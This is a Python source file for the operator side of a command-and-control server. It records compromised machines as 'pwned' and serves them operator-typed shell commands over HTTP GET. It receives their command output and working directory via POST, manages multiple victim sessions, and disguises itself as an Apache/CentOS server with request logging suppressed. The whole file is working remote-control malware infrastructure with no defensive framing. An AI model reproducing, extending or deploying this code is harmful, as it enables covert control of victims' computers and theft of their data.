#!/bin/python3
"""
C2 Server side code
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote_plus
from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
    CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
from inputimeout import inputimeout, TimeoutOccurred

class C2Handler(BaseHTTPRequestHandler):
    """ This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP request of our C2 server. """
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"
    
    # noinspection PyPep8Naming
    def do_GET(self):
        global active_session, client_account, client_hostname, pwned_id, pwned_dict

        # compromised computer request exfiltrate datas
        if self.path.startswith(CMD_REQUEST):
            # split client infos from GET initial request
            client = self.path.split(CMD_REQUEST)[1]
            client_account = client.split('@')[0]
            client_hostname = client.split('@')[1]
            
            # client not into our pwned_dict yet
            if client not in pwned_dict.values():
                self.http_response(HTTPStatusCode.NOT_FOUND.value)

                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # interactive session with client
            elif client == pwned_dict[active_session]:
                if INPUT_TIMEOUT:
                    # Azure kills waiting HTTP GET session after 4 min, so must handle input with a timeout
                    try:
                        cmd = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ", timeout=INPUT_TIMEOUT)
                    except TimeoutOccurred:
                        cmd = KEEP_ALIVE_CMD
                else:
                    cmd = input("{client_account}@{client_hostname}:{cwd}$ ")
                try:
                    self.http_response(HTTPStatusCode.OK.value)
                    # passing back command to client; must be utf-8 encode
                    self.wfile.write(cmd.encode())
                except BrokenPipeError as e:
                    print(f"Lost connection to {pwned_dict[active_session]}.\n")
                    del pwned_dict[active_session]
                    # if dict empty, re-init vars to their starting val
                    if not pwned_dict:
                        print("Waiting for new connection")
                        pwned_id = 0
                        active_session = 1
                    else:
                        while True:
                            # display sessions in dict to switch a new active one.
                            print(*pwned_dict.items(), sep="\n")
                            try:
                                new_session = int(input("\nChoose a session nbr to make active: "))
                            except ValueError:
                                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
                                continue
                            if new_session in  pwned_dict:
                                active_session = new_session
                                print(f"\nActive session is now: {pwned_dict[active_session]}")
                                break
                            else:
                                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
                                continue

            # if client is in pwned_dict but is not our active session
            else:
                # first send back 404 to the client
                self.http_response(HTTPStatusCode.NOT_FOUND.value)

    def do_POST(self):
        if self.path == RESPONSE_PATH:
            print(self.handle_post_data())
        elif self.path == CWD_RESPONSE:
            # change path display into terminal to locate current dir
            global cwd
            cwd = self.handle_post_data()
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server. Why ?\n")
                
    def handle_post_data(self):
        self.http_response(HTTPStatusCode.OK.value)
        content_length = int(self.headers.get("Content-Length"))
        # Gather the client's data by reading in the HTTP POST data
        client_data = self.rfile.read(content_length)
        # UTF-8 decode the client's data
        client_data = client_data.decode()
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
        client_data = unquote_plus(client_data)
        return client_data

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    
    def log_request(self, code = "-", size = "-"):
        """ rewrite log to just keep interesting datas into c2 request tracks """
        return 

active_session = 1
cwd = "~"
client_account = ""
client_hostname = ""
pwned_id = 0
pwned_dict = {}

print("server version:", C2Handler.server_version)
print("sys_version:", C2Handler.sys_version)

server = HTTPServer((BIND_ADDR, PORT), C2Handler)
server.serve_forever()
# def run(server_class=HTTPServer, handler_class=BHTTPR):
#     server_address = ('', 8900)
#     httpd = server_class(server_address, handler_class)
#     httpd.serve_forever()